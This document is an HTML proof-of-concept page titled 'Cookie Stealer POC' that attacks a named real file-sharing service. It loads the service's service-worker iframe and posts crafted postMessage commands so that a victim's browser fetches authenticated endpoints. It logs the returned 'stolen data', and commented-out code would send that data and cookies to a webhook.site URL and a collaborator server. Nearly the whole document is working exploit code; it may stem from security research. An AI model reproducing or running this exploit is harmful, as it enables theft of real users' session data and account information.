<html>
<head>
  <meta charset="UTF-8" />
  <title>Cookie Stealer POC</title>
</head>
<body>
  <h1>Exploit Running...</h1>
  <div id="log"></div>

  <script>
    const log = (msg) => {
      console.log(msg);
      document.getElementById('log').innerHTML += `<p>${msg}</p>`;
    };

    const iframe = document.createElement('iframe');
    iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me&1p=1';
    document.body.appendChild(iframe);

    // Listen for responses
    window.addEventListener('message', (e) => {
      log('[MESSAGE] Origin: ' + e.origin);
      log('[MESSAGE] Data: ' + JSON.stringify(e.data));

      // If we got a response with data
      if (e.data?.result?.data) {
        log('[SUCCESS] Stolen data received!');
        log('[DATA] ' + e.data.result.data);
        
        // Exfiltrate to your server
        // fetch('https://webhook.site/a90fcf0f-218a-46ef-a113-6bc249382768/stolen', {
        //   method: 'POST',
        //   body: JSON.stringify({
        //     stolen: e.data.result.data,
        //     timestamp: new Date().toISOString()
        //   })
        // });
      }
    });

    iframe.onload = () => {
      log('[LOADED] Iframe loaded');

      setTimeout(() => {
        // Attack 1: Make victim fetch their own authenticated endpoint
        log('[ATTACK1] Fetching victim account data...');
        iframe.contentWindow.postMessage({
          type: 1,
          clientId: 'steal-data',
          command: {
            commandType: 0,
            params: {
              // url: 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?test='+Date.now(),
              url: 'https://tagging.wetransfer.com/g/collect?v=2&tid=G-0M019DTWVR&gtm=45he61k2v893550495z8890364660za20kzb890364660zd890364660&_p=1769035027254&gcs=G101&gcd=13p3tPp2p7l1&npa=1&dma_cps=-&dma=1&cid=1987017646.1766952586&ecid=1170967742&ul=en-us&sr=1920x1080&_fplc=0&ur=&uaa=arm&uab=64&uafvl=Not(A%253ABrand%3B8.0.0.0%7CChromium%3B144.0.7559.97%7CGoogle%2520Chrome%3B144.0.7559.97&uamb=0&uam=&uap=macOS&uapv=26.2.0&uaw=0&are=1&frm=0&pscdl=denied&_eu=AAAAAEQ&sst.rnd=304977242.1769035028&sst.ngs=1&sst.tft=1769035027254&sst.lpc=112539906&sst.navt=n&sst.ude=0&sst.sw_exp=1&ngs=1&_s=1&tag_exp=103116026~103200004~104527907~104528501~104684208~104684211~105391253~115495940~115938465~115938469~116185179~116185180~117041587~117171315&dl=https%3A%2F%2Fwetransfer.com%2F&sid=1769035027&sct=3&seg=0&dt=&_tu=DAg&en=page_view&_ss=1&ep.gtm_info=GTM-NS54WBW%7Cversion%3A136%7Cenvironment%3ALive%7Cdebug%3Afalse&ep.consent_analytics=false&ep.consent_marketing=false&ep.hit_timestamp_local=2026-01-21T23%3A37%3A07.526%2B01%3A00&epn.hit_timestamp_unix=1769035027527&ep.tag_name=GA4%20-%20page_view&ep.wt_data=%7B%22navigator_language%22%3A%22en-US%22%2C%22action_source%22%3A%22web%22%7D&tfd=1219&richsstsse',
              // url: 'https://pwn.ma/daemoon.json',
              method: 0,
              processResponse: true
            }
          }
        }, '*');

        // Attack 2: Send victim's cookies to your server directly
        // (Check your collaborator logs for the Cookie header)
        // setTimeout(() => {
        //   log('[ATTACK2] Sending cookies to collaborator...');
        //   iframe.contentWindow.postMessage({
        //     type: 1,
        //     clientId: 'send-cookies',
        //     command: {
        //       commandType: 0,
        //       params: {
        //         url: 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?badrooo',
        //         method: 0
        //       }
        //     }
        //   }, '*');
        // }, 1000);

      }, 500);
    };
  </script>
</body>
</html>
